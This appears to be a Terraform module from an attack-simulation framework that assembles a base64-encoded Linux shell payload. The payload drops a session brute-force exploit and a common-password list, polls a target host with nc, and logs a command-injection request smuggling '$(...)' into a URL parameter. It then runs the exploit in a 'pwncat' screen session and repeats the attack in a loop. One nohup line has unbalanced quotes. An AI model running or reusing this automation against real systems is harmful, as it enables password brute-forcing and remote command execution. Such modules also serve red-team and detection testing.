locals {
    exploit_script = "bruteforce_session.py"
    attack_dir = "/authapp_attack"
    target_ip=var.inputs["target_ip"]
    target_port=var.inputs["target_port"]
    payload = <<-EOT
    log "cleaning app directory"
    rm -rf ${local.attack_dir}
    mkdir -p ${local.attack_dir}
    cd ${local.attack_dir}
    echo ${local.exploit} | base64 -d > ${local.exploit_script}
    echo ${local.requirements} | base64 -d > requirements.txt
    log "installing required python3.9..."
    apt-get install -y python3.9 python3.9-venv >> $LOGFILE 2>&1
    curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py >> $LOGFILE 2>&1
    python3.9 get-pip.py >> $LOGFILE 2>&1
    log "wait before using module..."
    sleep 5
    python3.9 -m pip install -U pip setuptools wheel setuptools_rust jinja2 jc
    log "installing exploit requirements..."
    python3.9 -m pip install --ignore-installed -r requirements.txt
    cat > passwords.txt <<'EOF'
    123456
    123456789
    111111
    password
    qwerty
    abc123
    12345678
    password1
    1234567
    123123
    Hello World!
    EOF

    START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
    while true; do
        log "starting script..."
        log "payload: curl --get --verbose \"http://${local.target_ip}:${local.target_port}/api/getServices\" --data-urlencode 'name[]=\$(${var.inputs["payload"]})'"
        log "checking target: ${local.target_ip}:${local.target_port}"
        while ! nc -z -w 5 -vv ${local.target_ip} ${local.target_port} > /dev/null; do
            log "failed check - waiting for target";
            sleep 30;
        done;
        log "target available - sending payload";
        sleep 5;
        
        # payload goes here :)

        SCREEN_LOG="/tmp/authapp_exploit.log"
        for i in `seq $((MAXLOG-1)) -1 1`; do mv "$SCREEN_LOG."{$i,$((i+1))} 2>/dev/null || true; done
        mv $SCREEN_LOG "$SCREEN_LOG.1" 2>/dev/null || true
        log "starting background process via screen..."
        screen -S pwncat -X quit
        screen -wipe
        nohup /bin/bash -c "screen -d -L -Logfile $SCREEN_LOG -S pwncat -m python3.9 ${local.exploit_script} >/dev/null 2>&1 &
        screen -S pwncat -X colon "logfile flush 0^M"

        # payload ends here :(

        log 'waiting 30 minutes...';
        sleep 1800
        CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
        if [ "$CHECK_HASH" != "$START_HASH" ]; then
            log "payload update detected - exiting loop"
            break
        else
            log "restarting loop..."
            log "waiting ${var.inputs["attack_delay"]} seconds...";
            sleep ${var.inputs["attack_delay"]}
        fi
    done
    log "Done."
    EOT


    exploit        = base64encode(file(
                                "${path.module}/resources/bruteforce_session.py", 
                            ))
    requirements        = base64encode(file(
                                "${path.module}/resources/requirements.txt", 
                            ))

    base64_payload = templatefile("${path.root}/modules/common/any/payload/linux/delayed_start.sh", { config = {
        script_name = var.inputs["tag"]
        log_rotation_count = 2
        apt_pre_tasks = ""
        apt_packages = ""
        apt_post_tasks = ""
        yum_pre_tasks =  ""
        yum_packages = ""
        yum_post_tasks = ""
        script_delay_secs = var.inputs["attack_delay"]
        next_stage_payload = local.payload
    }})

    outputs = {
        base64_payload = base64gzip(local.base64_payload)
        base64_uncompressed_payload = base64encode(local.base64_payload)
        base64_uncompressed_payload_additional = []
    }
}

